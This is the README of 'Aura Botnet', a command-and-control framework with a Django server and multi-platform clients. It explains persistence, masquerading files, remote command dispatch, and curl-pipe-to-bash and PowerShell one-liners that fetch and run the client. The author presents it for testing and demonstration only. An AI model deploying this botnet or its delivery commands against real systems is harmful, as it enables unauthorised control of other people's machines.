# Aura Botnet

C2 Server
---
The botnet's C2 server utilizes the Django framework as the backend.
It is far from the most efficient web server, but this is offset by the
following:
* Django is extremely portable and therefore good for testing/educational
purposes. The server and database are contained within the [`aura-server`](aura-server)
folder.
* Django includes a very intuitive and powerful admin site that can be used
for managing bots and commands
* The server is only handling simple POST requests and returning text
* Static files should be handled by a separate web server (local or remote) that
excels in serving static files, such as nginx

The admin site located at `http://your_server:server_port/admin` can be
accessed after setting up a superuser (see below).

Database
---
The C2 server is currently configured to use a SQLite3 database,
`bots.sqlite3`. The current configuration can be changed in [`aura-server/aura/settings.py`](aura-server/aura/settings.py).
You may wish to use MySQL, or even PostgreSQL instead; this easy to do thanks
to Django's portable database API.

Bot Clients
---
The primary client is written in C++, and can be compiled for either Linux or
Windows using CMake. Alternate clients are written in Rust, Bash, and Powershell,
but are may lack certain functionality as they are mostly unsupported. I will fix
any major bugs that come to my attention, but they will continue to lack certain
features for the time being, such as running commands in different shells.

The client will gather relevant system information and send it to the C2 server
to register the new bot. Identification is done by initially creating a file
containing random data -- referred to as the *auth file* throughout the code -- which
will then be hashed each time the client runs to identify the client and
authenticate with the C2 server. It will then install all the files in the
folder specified in the code, and initialize the system service or schedule a
task with the same privileges that the client was run with. The default settings
have the client and other files masquerading as configuration files.

Getting Started: C2 Server
---
### Docker
The Docker image can be found [here](https://hub.docker.com/r/watersalesman/aura-c2/).
Follow the instructions below to run the server normally.

### From Git
To initialize the SQLite3 database, simply change into the [`aura-server`](aura-server)
directory and run:
```
./manage.py migrate
```
After the database is initialized, create a superuser for the admin site by
running
```
./manage.py createsuperuser
```
More information on configuring database
and the admin site can be found in the following
[tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial02/)
and [documentation](https://docs.djangoproject.com/en/1.11/ref/databases/).

Finally, run the following to start the server:
```
./runserver.sh
```
[`runserver.sh`](aura-server/runserver.sh) is just a wrapper around `manage.py runserver` with some default
options that runs the server on port 41450. This can be easily edited or
bypassed altogether.

Geting Started: Bot Clients
---
The client executable or script need to be run in the same folder as
any necessary components (systemd services for Linux clients and launcher.vbs
for Powershell) on the target machine, or installed via web delivery (see
below).

You can choose whichever client you feel is most appropriate for the platform
and use case, although specified above, the C++ client is the first priority
when it comes to features and stability.

### C++ Client
There are three header-only projects being used for this client. Thanks to the
following projects for their awesome work:
* [okdshin/PicoSHA2](https://github.com/okdshin/PicoSHA2/) -
A header-file-only, SHA256 hash generator in C++
* [Tencent/rapidjson](https://github.com/Tencent/rapidjson/) -
A fast JSON parser/generator for C++ with both SAX/DOM style API
* [catchorg/Catch2](https://github.com/catchorg/Catch2/) -
A modern, C++-native, header-only, test framework for unit-tests, TDD and BDD

If the repo was not cloned with the `--recursive` flag, pull the mentioned
dependencies by running:
```
git submodule update --init --recursive
```

For the Linux C++ client, you will also need *libcurl* installed with
development files. There may be a *libcurl-devel* or *libcurl-dev* package on
your distro that you need to install.

Afterward, change into the source directory ([`aura-client`](aura-client)).
Then build by running:
```
cmake .    # Run with "-DCMAKE_BUILD_TYPE=Debug" to build tests
make
```

For building the Windows C++ client, you can find various methods of using
CMake on Windows
[here](http://preshing.com/20170511/how-to-build-a-cmake-based-project/).

Catch2 unit tests can be found under [`aura-client/tests/`](aura-client/tests/).
Do not run them in parallel. They rely on constant filenames and may interfere
with each other.

### Rust Client
For the Rust client, you will need Rust installed on the platform that you wish
to compile for. Unfortunately, there is no simple method of cross-compiling that
I am aware of. Go into the source directory ([`alt-clients/rust/rust-linux`](alt-clients/rust/rust-linux) or
[`alt-clients/rust/rust-windows`](alt-clients/rust/rust-windows) and run:
```
cargo build --release
```
The binary will be sent to `client/rust-*/target/release/`.

### Powershell and Bash
The Powershell and Bash clients simply need to be executed on the target
machine.

Configuring Commands
---
These can easily be managed through the Django admin site or shell. The
client periodically communicates with the specified server using POST
requests to receive a command (default is every 5 minutes). Commands are
received as a JSON object specifying the shell to run the command in, file
dependencies, and the command to execute.

Commands can be set to run for specific bot groups defined by operating
system and user privilege.  This is specified in
[`aura-server/groups.json`](aura-server/groups.json).
The only reserved group numbers are `-1`, for priority commands that are
run by all bots, and `-2`, for default commands that are run by all bots
only if there is no other command to run; you can also assign commands to
individual bots using the hash of their auth file.

Each command can be given a start time and end time. Oneshot commands will
only run once on each bot.

You can also specify file dependencies. These will be retrieved, before
running the command, into the same temporary directory that the command is
executed in. You can specify files on the bot's local filesystem with a file
path or a network file with a url path.

Client Web Delivery
---
The *static* folder can be used to store files to be served by a web server --
preferably an nginx server running on a different port or host as your Django
server. You will need to compile and place the files into the folders, and edit
the index files to reflect any changes like the server name. The simplicity of
executing via web delivery makes it easy to integrate with exploits that run
arbitrary code. An example in bash would be:

```
curl http://static-server-name/welcome/linux/rust | bash
```
In Powershell:
```
Invoke-RestMethod http://static-server-name/welcome/windows/rust | powershell
```

This will run the client with the current privileges, install any necessary
files, and cleanup the downloaded files.

Other Notes
---
Because this is for testing purposes, the C2 server needs to be
hard-coded into client and web delivery files. It is currently set to
*localhost* on all the files. This is because an actual botnet would use something
like a domain generation algorithm (DGA) to sync a stream of changing domains on
the client side with a stream of disposable domains being registered -- or just
really bulletproof hosting like the original Mirai botnet.

The code is also not obfuscated nor is there any effort put toward preventing
reverse engineering; this would defeat the purpose of being a botnet for
testing and demonstrations.

The *killswitch* folder contains scripts for easy client removal when testing
on your devices.

<h2>This repo is for testing/demonstration purposes only. This is not meant to
be implemented in any real world applications except for testing on authorized
machines.</h2>
